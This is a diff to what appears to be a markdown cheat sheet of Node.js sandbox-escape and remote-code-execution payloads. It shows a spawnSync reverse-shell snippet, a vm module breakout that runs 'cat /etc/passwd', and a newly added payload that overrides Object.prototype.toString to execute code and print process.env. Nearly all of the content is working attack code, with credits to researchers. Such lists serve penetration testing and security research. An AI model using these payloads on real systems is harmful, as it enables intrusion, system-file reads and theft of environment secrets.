@@ -82,7 +82,7 @@ const pwn=require('zlib').createGzip();const inx=require('fs').createReadStream(
 ```
 
 Sandbox Bypass spawnSync (by [netspi](https://t.co/3D9kWREcUz))
-```
+```javascript
 var resp = spawnSync('python',
 ['-c',
 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
@@ -96,12 +96,23 @@ print(resp.stderr);
 
 vm module breakout (by [pwnisher](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html))
 
-```
+```javascript
 "use strict";
 const vm = require("vm");
 const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
 process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
 console.log(xyz);
+```
+
+Alternative RCE payload (by [mahmoud](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html))
+
+```javascript
+x = ''
+myToString = x.toString.bind("console.log(process.env)")
+myToStringArr = Array(myToString)
+myToStringDescriptor = Object.getOwnPropertyDescriptor(myToStringArr, 0)
+Object.defineProperty(Object.prototype, "toString", myToStringDescriptor)
+Object.constructor("test", this)()
 ```
 
 ### Need More ?
